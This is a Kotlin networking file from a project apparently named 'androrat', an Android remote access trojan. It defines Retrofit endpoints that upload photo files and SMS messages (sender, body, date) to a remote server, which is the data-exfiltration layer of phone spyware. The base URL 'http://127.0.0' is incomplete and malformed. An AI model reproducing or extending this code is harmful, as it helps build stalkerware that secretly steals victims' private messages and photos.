package com.ierusalem.androrat.core.data.networking

import okhttp3.MultipartBody
import okhttp3.ResponseBody
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Field
import retrofit2.http.FormUrlEncoded
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part

interface ApiService {
    @Multipart
    @POST("upload")
    suspend fun uploadPhotos(
        @Part file: MultipartBody.Part
    ): Response<ResponseBody>

    @FormUrlEncoded
    @POST("sms")
    suspend fun uploadSMS(
        @Field("address") address: String,
        @Field("body") body: String,
        @Field("date") date: String
    ): Response<ResponseBody>
}

object RetrofitInstance {
    private const val BASE_URL = "http://127.0.0"

    private val retrofit by lazy {
        Retrofit.Builder()
            .baseUrl(BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
    }

    private val apiService by lazy {
        retrofit.create(ApiService::class.java)
    }

    fun api(): ApiService {
        return apiService
    }

    val api: RetrofitInstance 
        get() = this
}

suspend fun RetrofitInstance.uploadPhotos(file: MultipartBody.Part): Response<ResponseBody> {
    return api().uploadPhotos(file)
}

suspend fun RetrofitInstance.uploadSMS(address: String, body: String, date: String): Response<ResponseBody> {
    return api().uploadSMS(address, body, date)
}
